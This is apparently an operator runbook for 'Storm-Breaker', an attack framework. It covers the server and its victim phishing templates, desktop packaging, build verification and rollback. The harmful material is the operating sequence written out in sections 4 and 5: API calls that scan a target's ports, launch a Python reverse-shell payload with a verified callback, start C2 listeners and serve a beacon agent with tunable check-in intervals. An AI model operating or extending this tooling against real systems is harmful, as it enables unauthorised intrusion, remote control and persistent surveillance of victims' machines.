# RUNBOOK — Storm-Breaker (P13.1)

Operator runbook. Assumes `feat/t1-skeleton` at the latest `g*`-tagged commit.

## 1. Run it (dev / server mode)

```bash
cd storm-web
pip install -r requirements.txt        # flask, psutil, requests
python3 app.py                         # binds 0.0.0.0:2525
```

Panel: `http://<host>:2525/panel` — credentials in `storm-web/config.php`.
Victim templates: `http://<host>:2525/t/<name>/`.

## 2. Run it (desktop app)

```bash
bash scripts/build_sidecar.sh          # PyInstaller backend -> src-tauri/sidecar/
bash scripts/build_app.sh              # tauri build -> deb + AppImage
```

The shell spawns the sidecar, opens the panel in a webview, and lives in the tray.
**Quit from the tray** — SIGTERM to the shell bypasses the exit hook (known edge,
documented since G6).

## 3. Verify a build or an upgrade

Run **serially** — the suite and the audit both bind `:2525`.

```bash
python3 -m pytest -q                                  # expect 299 passed
bash audit/run_audit.sh ; echo "exit=$?"               # expect PASS, exit 0
python3 scripts/acceptance_firepower.py ; echo "exit=$?"   # G10
python3 scripts/acceptance_g11.py ; echo "exit=$?"         # G11
python3 scripts/acceptance_g12.py ; echo "exit=$?"         # G12
git status --porcelain                                 # expect empty
```

## 4. Operate — the firepower loop

```
POST /api/net/scan        {"host":"10.0.0.5","ports":"1-1024"}     -> real open ports
POST /api/strike/reverse  {"payload_type":"python_reverse"}        -> payload launched + callback VERIFIED
GET  /api/targets/<id>                                             -> evidence trail
GET  /api/targets/<id>/report                                      -> self-contained HTML
GET  /api/events                                                   -> SSE live stream
```

One-click, unattended, no copy-paste — that is the acceptance definition
(`scripts/acceptance_firepower.py`).

Rebuild a report artifact off-box:
```bash
python3 scripts/make_report.py --target <id> --out report.html
```

## 5. C2 + beacon

```
POST /api/listeners/start {"name":"catch","host":"127.0.0.1","port":0}
GET  /api/listeners                          -> connections (evidence auto-recorded)
POST /api/c2/beacon_config {"base_ms":1500}  -> beacon speed
GET  /api/c2/beacons[/<uid>]                 -> observed arrivals, interval, missed
GET  /api/c2/beacon_agent?uid=x              -> agent that honours the server interval
```

## 6. Rollback

| Level | Command |
|---|---|
| last commit | `git revert HEAD` |
| a track | `git checkout g12-ok` / `g11-ok` / `g10-ok` |
| whole upgrade | `git checkout pre-upgrade` + restore `backups/storm_breaker.db.*` |

Rollbacks are safe because everything was additive: no frozen module was edited
and no existing route was removed.

## 7. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| 42 char tests fail at once | suite and audit ran in parallel (both bind `:2525`) — re-run serially |
| `cargo: 1.75.0` on build | bare shell picked `/usr/bin/cargo`; use `bash scripts/build_app.sh` |
| panel blank / no fonts | offline assets expected — check `assets/vendor/` |
| tray Quit leaves a process | use tray Quit, not SIGTERM |
| SSE shows `reconnecting` | server restarted; the panel reconnects automatically |

## 8. Health

```
GET /api/live      -> subscribers, listeners, beacons (cheap)
GET /api/c2/beacons -> cadence + missed beacons (drift detection)
```
